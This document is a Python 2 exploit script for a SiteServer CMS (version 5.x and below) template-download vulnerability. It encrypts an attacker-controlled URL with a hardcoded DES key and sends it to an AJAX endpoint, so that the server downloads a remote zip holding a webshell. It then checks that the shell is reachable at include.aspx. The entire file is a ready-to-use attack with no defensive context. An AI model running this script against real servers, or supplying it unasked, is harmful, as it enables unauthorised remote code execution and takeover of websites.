#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
siteserver <=5.x版本模板下载getshell漏洞
'''

import requests
import base64
import time
from pyDes import *

# name = ''.join(random.sample(string.digits , 10))
Des_Key = "vEnfkn16" # Key
Des_IV = "\x12\x34\x56\x78\x90\xAB\xCD\xEF" # 自定IV向量

#/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=&directoryName=siteserver
#www.rootkit.net.cn</a>
#/sitefiles/sitetemplates/siteserver/include.aspx


def exploit(url, shell_url):
    enc = DesEncrypt_Url(shell_url)
    header={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
    payload="/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl={}&directoryName=siteserver".format(enc)
    url_fina = url+payload
    try:
        requests.get(url_fina,headers=header,timeout=5,allow_redirects=False,verify=False)
        time.sleep(1)
        text = url+"/sitefiles/sitetemplates/siteserver/include.aspx"
        content = requests.get(text,headers=header,timeout=5,allow_redirects=False,verify=False)
        if content.status_code == 200 and "www.rootkit.net.cn</a>" in content.text:
            print "True"
            print text
            sys.exit()
        else:
            print False
    except Exception,e:
        print False


def DesEncrypt_Url(str):
    k = des(Des_Key, CBC, Des_IV, pad=None, padmode=PAD_PKCS5)
    EncryptStr = k.encrypt(str)
    sec =  base64.b64encode(EncryptStr) #转base64编码返回
    str_decry = sec.replace("+", "0add0").replace("=", "0equals0").replace("&", "0and0").replace("?", "0question0").replace("/", "0slash0")
    # print str_decry
    return str_decry

if __name__ == '__main__':
    if len(sys.argv) <3:
        print "please use python {} http://siteserver.com http://shell.com/shell.zip".format(sys.argv[0])
        sys.exit()
    else:
        url = sys.argv[1]
        shell_url = sys.argv[2]
        exploit(url,shell_url)

